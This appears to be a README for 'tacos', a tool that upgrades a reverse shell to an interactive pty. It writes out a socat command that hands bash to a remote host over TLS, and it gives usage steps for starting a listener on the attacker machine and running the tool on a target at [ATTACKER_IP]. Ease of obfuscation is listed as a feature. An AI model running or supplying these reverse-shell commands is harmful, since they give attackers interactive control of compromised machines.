# tacos
<sup>(reverse `socat`)</sup>

Spawn a pty in your reverse shell to automaticcaly make it interactive.

Equivalent of:
```shell
socat exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:10.0.2.15:443,verify=0
```
**Why ?**
* too lazy to copy/paste/learn socat command
* provide more advanced configuration to the tty (alias, etc)
* easier to obfuscate
* cross-platform (to do) 


## Usage

`tacos` is built to work with the simple and dramatically effective project [`pty4all`](https://github.com/laluka/pty4all):
```shell
# On attacker machine
./socat-multi-handler.sh --lhost [ATTACKER_IP] --lport 443 --webport 80

# On target (transfer tacos as you wish)
./tacos [ATTACKER_IP]
# 💥
```
